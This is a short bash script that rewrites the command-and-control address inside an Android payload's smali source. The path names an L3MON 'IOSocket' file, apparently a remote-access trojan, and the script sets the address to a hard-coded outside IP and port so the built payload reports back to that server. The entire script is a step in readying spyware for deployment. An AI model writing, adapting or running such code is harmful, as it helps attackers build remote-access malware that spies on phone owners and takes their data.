#!/bin/bash
IP="77.105.133.37"
PORT="22222"
FILE="payload_source/smali/com/etechd/l3mon/IOSocket.smali"

if [ -f "$FILE" ]; then
    echo "Patching $FILE with IP $IP and PORT $PORT"
    # Find the line with http:// and replace it. 
    # In smali it usually looks like const-string vX, "http://IP:PORT?model="
    sed -i "s|http://[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}:[0-9]\{1,5\}|http://$IP:$PORT|g" "$FILE"
else
    echo "Error: $FILE not found!"
    exit 1
fi
